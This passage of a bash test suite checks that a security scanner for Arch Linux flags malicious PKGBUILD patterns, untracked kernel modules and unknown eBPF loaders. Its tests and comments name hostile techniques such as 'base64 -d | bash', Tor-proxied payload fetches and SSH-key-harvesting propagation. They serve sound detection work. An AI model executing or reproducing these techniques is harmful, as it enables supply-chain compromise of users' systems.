    printf '%s\n' "$tmpdir12/pcloud-launcher.sh" > "$allow_file5"
    rc=0
    out=$(AUTOSTART_HOME="$tmpdir12" AUTOSTART_ALLOWLIST_FILE="$allow_file5" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 0 && "$out" == *"Clean"* && "$out" != *"WARNING"* ]]; then
        pass "check_autostart: quoted Exec= value allowlisted with unquoted path matches"
    else
        fail "check_autostart: allowlisting the unquoted path should match quoted Exec=, rc=$rc, out: $out"
    fi
    rm -rf "$tmpdir12"
    rm -f "$allow_file5"

    # Sub-test T: absolute .desktop Exec= path under the skel dir must NOT be
    # flagged — regression guard for a real false positive (an xfce4-panel
    # crash-loop workaround script, xfce-pbw.sh, shipped via /etc/skel and
    # referenced directly by the copied ~/.config/autostart/*.desktop rather
    # than duplicated into each home dir; only root can write there, same
    # trust bucket as /usr/local). AUTOSTART_SKEL_DIR overrides the real
    # /etc/skel so this doesn't touch actual system state.
    local tmpdir13 skeldir13
    tmpdir13=$(mktemp -d)
    skeldir13=$(mktemp -d)
    mkdir -p "$tmpdir13/.config/autostart" "$skeldir13/.config/autostart"
    cat > "$tmpdir13/.config/autostart/xfce-panel-workaround.desktop" << DESK
[Desktop Entry]
Type=Application
Name=XfcePanelWorkaround
Exec=$skeldir13/.config/autostart/xfce-pbw.sh
DESK
    rc=0
    out=$(AUTOSTART_HOME="$tmpdir13" AUTOSTART_SKEL_DIR="$skeldir13" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ "$out" == *"Clean"* && "$out" != *"WARNING"* ]]; then
        pass "check_autostart: absolute Exec= under skel dir not flagged"
    else
        fail "check_autostart: skel dir false positive regression, rc=$rc, out: $out"
    fi
    rm -rf "$tmpdir13" "$skeldir13"
}

# ---------------------------------------------------------------------------
# Test 12: check_pkgbuild_caches hardened obfuscation patterns
# ---------------------------------------------------------------------------
test_pkgbuild_obfuscation() {
    local fixtures="$SCRIPT_DIR/fake_pkgbuilds"
    local base_args=(
        --package-list="$SCRIPT_DIR/fake_package_lists/simple.txt"
        --malicious-npm-list="$SCRIPT_DIR/fake_npm_lists/malicious_npm.txt"
        --check-pkgbuild --no-notify
    )
    local out rc=0

    # Sub-test A: base64 -d | bash → WARNING
    rc=0
    out=$(PKGBUILD_CACHE_DIRS="$fixtures/pkg-base64" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"base64"* ]]; then
        pass "pkgbuild_obfuscation: base64-decode-to-shell detected"
    else
        fail "pkgbuild_obfuscation: base64 pattern missed, rc=$rc"
    fi

    # Sub-test A2: cleanup hint present, exactly once (it's printed once after
    # the whole scan loop, not per-pattern-match or per-file)
    local hint_count
    hint_count=$(grep -c "diff what's flagged above against a fresh clone" <<< "$out")
    if [[ "$out" == *"don't delete this cache first"* && "$hint_count" -eq 1 ]]; then
        pass "pkgbuild_obfuscation: cleanup hint present exactly once"
    else
        fail "pkgbuild_obfuscation: cleanup hint missing/duplicated, hint_count=$hint_count, out: $out"
    fi

    # Sub-test B: eval $(...) → WARNING
    rc=0
    out=$(PKGBUILD_CACHE_DIRS="$fixtures/pkg-eval" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"eval"* ]]; then
        pass "pkgbuild_obfuscation: eval+subshell detected"
    else
        fail "pkgbuild_obfuscation: eval pattern missed, rc=$rc"
    fi

    # Sub-test C: printf hex → WARNING
    rc=0
    out=$(PKGBUILD_CACHE_DIRS="$fixtures/pkg-printf" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"printf"* ]]; then
        pass "pkgbuild_obfuscation: printf hex/octal detected"
    else
        fail "pkgbuild_obfuscation: printf pattern missed, rc=$rc"
    fi

    # Sub-test D: variable-split reassembly → WARNING
    rc=0
    out=$(PKGBUILD_CACHE_DIRS="$fixtures/pkg-varsplit" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"variable-split"* ]]; then
        pass "pkgbuild_obfuscation: variable-split reassembly detected"
    else
        fail "pkgbuild_obfuscation: varsplit pattern missed, rc=$rc"
    fi

    # Sub-test E: clean PKGBUILD → no WARNING (includes a standard
    # `read -d $'\0'` NUL-delimited find -print0 loop — regression guard for
    # a real false positive reported live: a single ANSI-C-quoted delimiter
    # byte must not be flagged as hex/octal obfuscation)
    rc=0
    out=$(PKGBUILD_CACHE_DIRS="$fixtures/pkg-clean" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ "$out" == *"Clean"* && "$out" != *"WARNING"* ]]; then
        pass "pkgbuild_obfuscation: clean PKGBUILD (incl. read -d \$'\\0' idiom) → no false positive"
    else
        fail "pkgbuild_obfuscation: clean PKGBUILD triggered WARNING — false positive, out: $out"
    fi

    # Sub-test G: genuine ANSI-C hex-escape obfuscation (3+ chained \xHH
    # escapes spelling out a command) must still be caught — regression
    # guard so the false-positive fix above didn't just gut the check.
    rc=0
    out=$(PKGBUILD_CACHE_DIRS="$fixtures/pkg-ansic" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"ANSI-C hex/octal quoting"* ]]; then
        pass "pkgbuild_obfuscation: chained hex-escape obfuscation detected"
    else
        fail "pkgbuild_obfuscation: chained hex-escape obfuscation missed, rc=$rc, out: $out"
    fi

    # Sub-test F: summary table shows the softer "REVIEW" (not "INFECTED") for
    # this check — regression guard for the INFECTED/REVIEW wording split
    # (behavior-based checks like this one are heuristic and false-positive
    # prone, unlike a package-list/hash match, so the summary shouldn't imply
    # the same certainty for both).
    rc=0
    out=$(PKGBUILD_CACHE_DIRS="$fixtures/pkg-base64" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" --color=never 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"REVIEW"* && "$out" != *"INFECTED"* ]]; then
        pass "pkgbuild_obfuscation: summary shows REVIEW, not INFECTED"
    else
        fail "pkgbuild_obfuscation: expected REVIEW wording in summary, rc=$rc, out: $out"
    fi

    # Sub-tests H/J/K need a real git repo to exercise the git-tracked check
    # (see check_pkgbuild_caches) — can't commit a nested .git into this repo's
    # own fixtures (git would store it as a gitlink, not real files, so it
    # wouldn't survive a fresh clone elsewhere). Build one on the fly instead,
    # reusing the existing static fixture content.
    local gitcfg=(-c user.email=test@test -c user.name=test)

    # Sub-test H: ELF binary sitting directly next to PKGBUILD, committed to
    # the package's own git tree → WARNING + inspect hint
    local elf_git_dir
    elf_git_dir=$(mktemp -d)
    cp -a "$fixtures/pkg-elf/." "$elf_git_dir/"
    git -C "$elf_git_dir" init -q
    git -C "$elf_git_dir" "${gitcfg[@]}" add -A
    git -C "$elf_git_dir" "${gitcfg[@]}" commit -q -m init
    rc=0
    out=$(PKGBUILD_CACHE_DIRS="$elf_git_dir" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"WARNING: undocumented ELF binary in"* && \
          "$out" == *"helper-bin"* && \
          "$out" == *"inspect before building"* ]]; then
        pass "pkgbuild_obfuscation: undocumented ELF binary next to PKGBUILD detected"
    else
        fail "pkgbuild_obfuscation: ELF-next-to-PKGBUILD not detected, rc=$rc, out: $out"
    fi
    rm -rf "$elf_git_dir"

    # Sub-test I: ELF binary under src/ (expected build-output location) →
    # NOT flagged — regression guard against false positives on ordinary
    # source downloads/build artifacts. No git needed: excluded structurally
    # by -maxdepth 1 before the git-tracked check ever runs.
    rc=0
    out=$(PKGBUILD_CACHE_DIRS="$fixtures/pkg-elf-buildoutput" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ "$out" == *"Clean"* && "$out" != *"WARNING"* && "$out" != *"ELF"* ]]; then
        pass "pkgbuild_obfuscation: ELF under src/ not flagged"
    else
        fail "pkgbuild_obfuscation: ELF under src/ incorrectly flagged, rc=$rc, out: $out"
    fi

    # Sub-test J: symlink (not a plain file) committed to git next to
    # PKGBUILD, pointing at an ELF binary → still WARNING. Regression guard
    # for a real gap found in code review: plain `find -type f` excludes
    # symlinks (type l), so a symlinked ELF evaded Sub-test H's detection
    # entirely until `find -L` was added.
    local symlink_git_dir
    symlink_git_dir=$(mktemp -d)
    cp -a "$fixtures/pkg-elf-symlink/." "$symlink_git_dir/"
    git -C "$symlink_git_dir" init -q
    git -C "$symlink_git_dir" "${gitcfg[@]}" add -A
    git -C "$symlink_git_dir" "${gitcfg[@]}" commit -q -m init
    rc=0
    out=$(PKGBUILD_CACHE_DIRS="$symlink_git_dir" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"WARNING: undocumented ELF binary in"* && "$out" == *"helper-bin"* ]]; then
        pass "pkgbuild_obfuscation: symlinked ELF binary next to PKGBUILD detected"
    else
        fail "pkgbuild_obfuscation: symlinked ELF binary not detected, rc=$rc, out: $out"
    fi
    rm -rf "$symlink_git_dir"

    # Sub-test K: ELF binary present next to PKGBUILD but NOT committed to
    # git (only PKGBUILD/.SRCINFO tracked) → NOT flagged. Regression guard
    # for a real false positive reported live on pistol-bin/coolercontrol-bin:
    # both are legitimate -bin packages whose source_$CARCH=() is a raw
    # binary URL — makepkg downloads it straight into this same top-level
    # dir as a normal part of building (confirmed by reproducing an actual
    # `yay`-style build of pistol-bin: `git status` shows the binary as `??`,
    # untracked), completely unrelated to what the maintainer committed.
    local untracked_git_dir
    untracked_git_dir=$(mktemp -d)
    cp -a "$fixtures/pkg-elf/PKGBUILD" "$untracked_git_dir/"
    git -C "$untracked_git_dir" init -q
    git -C "$untracked_git_dir" "${gitcfg[@]}" add PKGBUILD
    git -C "$untracked_git_dir" "${gitcfg[@]}" commit -q -m init
    cp -a "$fixtures/pkg-elf/helper-bin" "$untracked_git_dir/"
    rc=0
    out=$(PKGBUILD_CACHE_DIRS="$untracked_git_dir" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ "$out" == *"Clean"* && "$out" != *"WARNING"* && "$out" != *"ELF"* ]]; then
        pass "pkgbuild_obfuscation: untracked ELF (makepkg source download, not committed) not flagged"
    else
        fail "pkgbuild_obfuscation: untracked ELF incorrectly flagged, rc=$rc, out: $out"
    fi
    rm -rf "$untracked_git_dir"

    # Sub-test L: duplicate source=() declaration → WARNING. Reported live:
    # storageexplorer-bin prepended a fake source=('optimizer') above the
    # real source=() array, staging a git-tracked binary makepkg never
    # actually references since the real array silently wins.
    rc=0
    out=$(PKGBUILD_CACHE_DIRS="$fixtures/pkg-dupsource" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"WARNING: duplicate source=() declaration in"* ]]; then
        pass "pkgbuild_obfuscation: duplicate source=() declaration detected"
    else
        fail "pkgbuild_obfuscation: duplicate source=() not detected, rc=$rc, out: $out"
    fi

    # Sub-test M: source=() plus per-arch source_x86_64=()/source_i686=() →
    # NOT flagged. Regression guard against false positives on the normal,
    # widely-used multi-arch PKGBUILD idiom — each key is tracked separately,
    # so distinct keys appearing once each must not look like a duplicate.
    rc=0
    out=$(PKGBUILD_CACHE_DIRS="$fixtures/pkg-multiarch" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ "$out" == *"Clean"* && "$out" != *"WARNING"* && "$out" != *"duplicate"* ]]; then
        pass "pkgbuild_obfuscation: per-arch source_\$CARCH=() not flagged as duplicate"
    else
        fail "pkgbuild_obfuscation: per-arch source_\$CARCH=() incorrectly flagged, rc=$rc, out: $out"
    fi

    # Sub-test N: source=() followed by source+=(...) (idiomatic array
    # append) -> NOT flagged. Regression guard for a real false positive
    # reported live on vscodium-bin: its PKGBUILD declares source=(...) then
    # appends one more entry via source+=("...code.svg"), which the
    # duplicate-source regex used to conflate with a second cold source=()
    # declaration since its capture group didn't distinguish "=" from "+=".
    rc=0
    out=$(PKGBUILD_CACHE_DIRS="$fixtures/pkg-source-append" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ "$out" == *"Clean"* && "$out" != *"WARNING"* && "$out" != *"duplicate"* ]]; then
        pass "pkgbuild_obfuscation: source=() then source+=() append not flagged as duplicate"
    else
        fail "pkgbuild_obfuscation: source=() then source+=() append incorrectly flagged, rc=$rc, out: $out"
    fi

    # Sub-test O: source+=('optimizer') staged BEFORE the real source=(...)
    # -> WARNING. Regression guard for the storageexplorer-bin attack with
    # the two operators swapped: source+=(...) on an as-yet-unset array is
    # bash-equivalent to source=(...), so a fake entry staged via += before
    # a later bare source=() is silently discarded exactly like the
    # already-caught two-bare-= case (Sub-test L) -- the Sub-test N fix must
    # not blind the check to this ordering just because a `+=` is involved.
    rc=0
    out=$(PKGBUILD_CACHE_DIRS="$fixtures/pkg-source-append-before-dup" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"WARNING: duplicate source=() declaration in"* ]]; then
        pass "pkgbuild_obfuscation: source+=() staged before real source=() detected as duplicate"
    else
        fail "pkgbuild_obfuscation: source+=() staged before real source=() not detected, rc=$rc, out: $out"
    fi

    # Sub-tests P-S: patterns added after the 2026-08-23 xsnow/xsnow-bin
    # AUR incident (aur-general mailing list) — a .install scriptlet pulled
    # a payload binary through Tor into /usr/local/bin, then self-propagated
    # by harvesting local SSH keys and pushing a trojaned install= field
    # into every other AUR repo reachable with them. Fixtures below use the
    # actual technique from the real .xsnow.install, not a paraphrase.

    # Sub-test P: curl through a SOCKS/Tor proxy to an .onion address → WARNING
    rc=0
    out=$(PKGBUILD_CACHE_DIRS="$fixtures/pkg-tor-fetch" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"WARNING: Tor/SOCKS-proxied fetch in"* ]]; then
        pass "pkgbuild_obfuscation: Tor/SOCKS-proxied fetch detected"
    else
        fail "pkgbuild_obfuscation: Tor/SOCKS-proxied fetch not detected, rc=$rc, out: $out"
    fi

    # Sub-test Q: download written straight into /usr/local/bin (not the
    # makepkg sandbox) → WARNING. Regression guard: a clean PKGBUILD fetching
    # its own source into $srcdir must NOT trip this (checked via pkg-clean
    # in Sub-test E already using a plain source=() URL, no -o at all).
    rc=0
    out=$(PKGBUILD_CACHE_DIRS="$fixtures/pkg-dl-syspath" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"WARNING: download targets a system path"* ]]; then
        pass "pkgbuild_obfuscation: download-to-system-path detected"
    else
        fail "pkgbuild_obfuscation: download-to-system-path not detected, rc=$rc, out: $out"
    fi

    # Sub-test R: reference to the AUR's own git SSH remote → WARNING
    rc=0
    out=$(PKGBUILD_CACHE_DIRS="$fixtures/pkg-aur-ssh" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"WARNING: reference to the AUR git SSH remote in"* ]]; then
        pass "pkgbuild_obfuscation: AUR git SSH remote reference detected"
    else
        fail "pkgbuild_obfuscation: AUR git SSH remote reference not detected, rc=$rc, out: $out"
    fi

    # Sub-test S: pacman -S --noconfirm invoked from a scriptlet → WARNING.
    # Regression guard: a read-only pacman query (e.g. -Qi, as archcanary's
    # own PKGBUILD post_install does to check whether lynis is installed)
    # must NOT trip this — no --noconfirm on that line, covered by pkg-clean
    # staying clean in Sub-test E.
    rc=0
    out=$(PKGBUILD_CACHE_DIRS="$fixtures/pkg-pacman-noninteractive" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"WARNING: non-interactive pacman call in"* ]]; then
        pass "pkgbuild_obfuscation: non-interactive pacman call detected"
    else
        fail "pkgbuild_obfuscation: non-interactive pacman call not detected, rc=$rc, out: $out"
    fi

    # Sub-test T: a single scriptlet combining all four techniques (same
    # shape as the real .xsnow.install, values defanged/synthetic — not the
    # verbatim incident payload, deliberately not committing a working
    # backdoor script into the repo) → all four new patterns fire on one
    # file. Belt-and-suspenders: any one pattern alone already flags it, but
    # this guards against a future edit narrowing a regex enough to lose
    # coverage on the combined real-world shape.
    rc=0
    out=$(PKGBUILD_CACHE_DIRS="$fixtures/pkg-multi-technique" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"Tor/SOCKS-proxied fetch"* \
          && "$out" == *"download targets a system path"* \
          && "$out" == *"reference to the AUR git SSH remote"* \
          && "$out" == *"non-interactive pacman call"* ]]; then
        pass "pkgbuild_obfuscation: combined multi-technique payload caught by all 4 new patterns"
    else
        fail "pkgbuild_obfuscation: combined multi-technique payload not fully caught, rc=$rc, out: $out"
    fi

    # Sub-tests U-V: regression guards for two evasions of Sub-test P found in
    # code review, both confirmed live before the fix — the original re_tor_proxy/
    # re_dl_syspath required "-x"/"-o" as a standalone flag, so curl's extremely
    # common bundled short-option style (-fsSLx, -fsSLo) evaded both patterns
    # entirely; re_onion required a delimiter right after ".onion", so a bare
    # .onion URL as the last token on a line evaded it too.

    # Sub-test U: bundled curl flags (-fsSLx proxy ... ) → still WARNING
    rc=0
    out=$(PKGBUILD_CACHE_DIRS="$fixtures/pkg-tor-fetch-bundled" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"WARNING: Tor/SOCKS-proxied fetch in"* ]]; then
        pass "pkgbuild_obfuscation: bundled curl short-flags (-fsSLx) still detected"
    else
        fail "pkgbuild_obfuscation: bundled curl short-flags (-fsSLx) evaded detection, rc=$rc, out: $out"
    fi

    # Sub-test V: bare .onion URL at end-of-line (no trailing delimiter) → still WARNING
    rc=0
    out=$(PKGBUILD_CACHE_DIRS="$fixtures/pkg-onion-eol" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"WARNING: Tor/SOCKS-proxied fetch in"* ]]; then
        pass "pkgbuild_obfuscation: bare .onion URL at end-of-line still detected"
    else
        fail "pkgbuild_obfuscation: bare .onion URL at end-of-line evaded detection, rc=$rc, out: $out"
    fi
}

# ---------------------------------------------------------------------------
# Test 13: check_kmod — unknown module detection via mocked lsmod
# ---------------------------------------------------------------------------
test_check_kmod() {
    local base_args=(
        --package-list="$SCRIPT_DIR/fake_package_lists/simple.txt"
        --malicious-npm-list="$SCRIPT_DIR/fake_npm_lists/malicious_npm.txt"
        --check-kmod --no-notify
    )
    local out rc=0

    # Helper: create a script that outputs fixed content
    make_cmd_script() {
        local script content
        script=$(mktemp); content="$1"
        printf '#!/bin/sh\nprintf "%%s" "%s"\n' "$content" > "$script"
        chmod +x "$script"; echo "$script"
    }

    local null_dkms
    null_dkms=$(make_cmd_script "")

    # Sub-test A: lsmod with an unknown module → WARNING (exit 2)
    local lsmod_evil
    lsmod_evil=$(make_cmd_script "$(printf 'Module                  Size  Used by\nevil_rootkit_kmod      65536  0\n')")

    rc=0
    out=$(LSMOD_CMD="$lsmod_evil" DKMS_CMD="$null_dkms" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"WARNING"* && "$out" == *"evil_rootkit_kmod"* ]]; then
        pass "check_kmod: unknown module → WARNING (exit 2) with name listed"
    else
        fail "check_kmod: unknown module not detected, rc=$rc"
    fi

    # Sub-test B: empty lsmod + empty dkms → clean
    local lsmod_empty
    lsmod_empty=$(make_cmd_script "$(printf 'Module                  Size  Used by\n')")

    rc=0
    out=$(LSMOD_CMD="$lsmod_empty" DKMS_CMD="$null_dkms" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ "$out" == *"Clean"* && "$out" != *"WARNING"* ]]; then
        pass "check_kmod: empty lsmod/dkms → clean"
    else
        fail "check_kmod: empty lsmod/dkms → expected clean, got: $out"
    fi

    # Sub-test C: DKMS module untracked by pacman, built for two kernels —
    # WARNING + remediation hint (both allowlist and cleanup paths), shown
    # once per module (not once per kernel entry).
    local dkms_evil
    dkms_evil=$(make_cmd_script "$(printf 'evil-driver/1.2.3, 6.18.41-1-lts, x86_64: installed\nevil-driver/1.2.3, 7.1.5-arch1-2, x86_64: installed\n')")

    rc=0
    out=$(LSMOD_CMD="$lsmod_empty" DKMS_CMD="$dkms_evil" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    local hint_count
    hint_count=$(grep -c "pkexec /usr/lib/archcanary/root-helper --allowlist-add=dkms:evil-driver" <<< "$out")
    if [[ $rc -eq 2 && "$out" == *"WARNING: DKMS module from untracked source: evil-driver/1.2.3"* && \
          "$out" == *"pkexec /usr/lib/archcanary/root-helper --allowlist-add=dkms:evil-driver"* && \
          "$out" == *"sudo dkms remove evil-driver/1.2.3 --all"* && \
          "$hint_count" -eq 1 ]]; then
        pass "check_kmod: untracked DKMS module → WARNING + both remediation paths, hint shown once"
    else
        fail "check_kmod: untracked DKMS module hint missing/wrong/duplicated, rc=$rc, hint_count=$hint_count, out: $out"
    fi

    # Sub-test D: DKMS's self-reported module name doesn't match its actual
    # pacman package (the common "-dkms" suffix convention, e.g. module
    # "broadcom-wl" <- package "broadcom-wl-dkms") — must resolve via the
    # module's own dkms.conf ownership, not just `pacman -Qi <bare name>`,
    # or every such package false-positives as untracked.
    local fake_bin
    fake_bin=$(mktemp -d)
    cat > "$fake_bin/pacman" << 'FAKEPACMAN'
#!/bin/sh
case "$1" in
    -Ql) exit 0 ;;
    -Qi) exit 1 ;;
    -Qo)
        case "$2" in
            */broadcom-wl-*/dkms.conf) echo "broadcom-wl-dkms is owned by broadcom-wl-dkms 1.0-1"; exit 0 ;;
            *) exit 1 ;;
        esac
        ;;
    *) exit 1 ;;
esac
FAKEPACMAN
    chmod +x "$fake_bin/pacman"

    local dkms_suffix_mismatch
    dkms_suffix_mismatch=$(make_cmd_script "broadcom-wl/6.30.223.271, 6.18.39-1-arch, x86_64: installed
")

    rc=0
    out=$(PATH="$fake_bin:$PATH" LSMOD_CMD="$lsmod_empty" DKMS_CMD="$dkms_suffix_mismatch" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 0 && "$out" != *"untracked source"* ]]; then
        pass "check_kmod: DKMS module name with -dkms-suffixed package resolved via dkms.conf ownership, not flagged"
    else
        fail "check_kmod: -dkms suffix mismatch incorrectly flagged untracked, rc=$rc, out: $out"
    fi

    rm -f "$null_dkms" "$lsmod_evil" "$lsmod_empty" "$dkms_evil" "$dkms_suffix_mismatch"
    rm -rf "$fake_bin"
}

# ---------------------------------------------------------------------------
# Test: check_pkginteg — ELF vs non-binary mismatch classification
# ---------------------------------------------------------------------------
test_check_pkginteg() {
    local base_args=(
        --package-list="$SCRIPT_DIR/fake_package_lists/simple.txt"
        --malicious-npm-list="$SCRIPT_DIR/fake_npm_lists/malicious_npm.txt"
        --check-pkginteg --no-notify
    )
    local out rc=0
    local elf_bin="$SCRIPT_DIR/fake_pkgbuilds/pkg-elf/helper-bin"

    # Sub-test A: one ELF mismatch + one non-binary mismatch → ELF gets
    # WARNING + reinstall command, non-binary gets softened to info: and
    # doesn't affect severity, exit 1 (only the ELF one counts).
    # Real pacman -Qkk splits output: "backup file:"/summary lines on
    # stdout, the "warning:" lines this check parses on stderr.
    local fake_pacman
    fake_pacman=$(mktemp)
    cat > "$fake_pacman" << EOF
#!/bin/sh
echo "fakepkg-elf: 1 total files, 1 altered files"
echo "fakepkg-conf: 1 total files, 1 altered files"
echo "warning: fakepkg-elf: $elf_bin (SHA256 checksum mismatch)" >&2
echo "warning: fakepkg-conf: /etc/fake.conf (SHA256 checksum mismatch)" >&2
EOF
    chmod +x "$fake_pacman"

    rc=0
    out=$(PACMAN_CMD="$fake_pacman" "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 1 && "$out" == *"warning: fakepkg-elf:"* && "$out" == *"info: fakepkg-conf:"* && \
          "$out" == *"WARNING: binary file(s) changed"* && "$out" == *"sudo pacman -S -- fakepkg-elf"* && \
          "$out" == *"INFO: non-binary mismatches"* && "$out" == *"Packages: fakepkg-conf"* ]]; then
        pass "check_pkginteg: ELF mismatch → WARNING+reinstall, non-binary → info, exit 1"
    else
        fail "check_pkginteg: mixed classification wrong, rc=$rc, out: $out"
    fi

    # Sub-test B: only a non-binary mismatch → exit 0 (clean), no WARNING
    # anywhere — the whole point of the severity split.
    local fake_pacman_nonbin
    fake_pacman_nonbin=$(mktemp)
    cat > "$fake_pacman_nonbin" << 'EOF'
#!/bin/sh
echo "fakepkg-conf: 1 total files, 1 altered files"
echo "warning: fakepkg-conf: /etc/fake.conf (SHA256 checksum mismatch)" >&2
EOF
    chmod +x "$fake_pacman_nonbin"

    rc=0
    out=$(PACMAN_CMD="$fake_pacman_nonbin" "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 0 && "$out" == *"info: fakepkg-conf:"* && "$out" != *"WARNING: binary"* ]]; then
        pass "check_pkginteg: only non-binary mismatch → exit 0 (clean), no WARNING"
    else
        fail "check_pkginteg: non-binary-only should be clean, rc=$rc, out: $out"
    fi

    rm -f "$fake_pacman" "$fake_pacman_nonbin"
}

# ---------------------------------------------------------------------------
# Test 14: check_bpftool — unknown loader detection + allowlist (lsm and
#          non-lsm hook types both resolve via pacman -Qo / the allowlist)
# ---------------------------------------------------------------------------
test_check_bpftool_allowlist() {
    local base_args=(
        --package-list="$SCRIPT_DIR/fake_package_lists/simple.txt"
        --malicious-npm-list="$SCRIPT_DIR/fake_npm_lists/malicious_npm.txt"
        --check-bpftool --no-notify
    )
    local out rc=0

    # A real, long-running, non-pacman-owned binary so /proc/<pid>/exe
    # resolves to something `pacman -Qo` genuinely doesn't own.
    local tmpdir loader_bin loader_pid
    tmpdir=$(mktemp -d)
    loader_bin="$tmpdir/test-loader"
    cp "$(command -v sleep)" "$loader_bin"
    "$loader_bin" 30 &
    loader_pid=$!
    sleep 0.3

    local fake_bpftool
    fake_bpftool=$(mktemp)
    cat > "$fake_bpftool" <<SCRIPT
#!/bin/sh
if [ "\$1" = "prog" ]; then
  cat <<PROGS
5: lsm  name my_hook  tag 1234567890abcdef  gpl
        loaded_at 2026-07-03T12:00:00+0200  uid 0
        xlated 100B  jited 100B  memlock 4096B
        pids test-loader($loader_pid)
PROGS
fi
SCRIPT
    chmod +x "$fake_bpftool"

    # Sub-test A: unknown non-pacman LSM loader, no allowlist → WARNING (exit 1)
    rc=0
    out=$(BPFTOOL_CMD="$fake_bpftool" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 1 && "$out" == *"WARNING"* && "$out" == *"test-loader"* ]]; then
        pass "check_bpftool: unknown lsm loader → WARNING (exit 1)"
    else
        fail "check_bpftool: unknown lsm loader → expected WARNING+exit1, got rc=$rc, out: $out"
    fi

    # Sub-test A2: WARNING output is followed by the allowlist remediation hint
    if [[ "$out" == *"pkexec /usr/lib/archcanary/root-helper --allowlist-add=bpftool:"* ]]; then
        pass "check_bpftool: allowlist hint present in WARNING output"
    else
        fail "check_bpftool: allowlist hint missing from WARNING output, got: $out"
    fi

    # Sub-test B: same loader, allowlisted by basename → INFO only, exit 0
    local allow_file
    allow_file=$(mktemp)
    printf 'test-loader\n' > "$allow_file"
    rc=0
    out=$(BPFTOOL_CMD="$fake_bpftool" BPFTOOL_ALLOWLIST_FILE="$allow_file" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 0 && "$out" == *"allowlisted"* && "$out" != *"WARNING"* ]]; then
        pass "check_bpftool: allowlisted lsm loader → INFO only, exit 0 (clean)"
    else
        fail "check_bpftool: allowlisted lsm loader → expected INFO+exit0, got rc=$rc, out: $out"
    fi

    # Sub-test C: a non-lsm stealth type (tracepoint) held by a pacman-owned
    # binary — the ananicy-cpp case — resolves to INFO, exit 0. Uses a real
    # coreutils `sleep` so `/proc/<pid>/exe` is genuinely pacman-owned.
    local pac_pid fake_bpftool_tp
    sleep 30 &
    pac_pid=$!
    sleep 0.3
    fake_bpftool_tp=$(mktemp)
    cat > "$fake_bpftool_tp" <<SCRIPT
#!/bin/sh
if [ "\$1" = "prog" ]; then
  cat <<PROGS
7: tracepoint  name watch_exec  tag abcdef1234567890  gpl
        loaded_at 2026-08-30T12:00:00+0200  uid 0
        xlated 200B  jited 200B  memlock 4096B
        pids sleep($pac_pid)
PROGS
fi
SCRIPT
    chmod +x "$fake_bpftool_tp"
    rc=0
    out=$(BPFTOOL_CMD="$fake_bpftool_tp" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 0 && "$out" == *"INFO: eBPF hook types present (tracepoint)"* && "$out" != *"WARNING"* ]]; then
        pass "check_bpftool: pacman-owned tracepoint loader → INFO only, exit 0"
    else
        fail "check_bpftool: pacman-owned tracepoint loader → expected INFO+exit0, got rc=$rc, out: $out"
    fi

    # Sub-test D: the same tracepoint program held by an unknown (non-pacman)
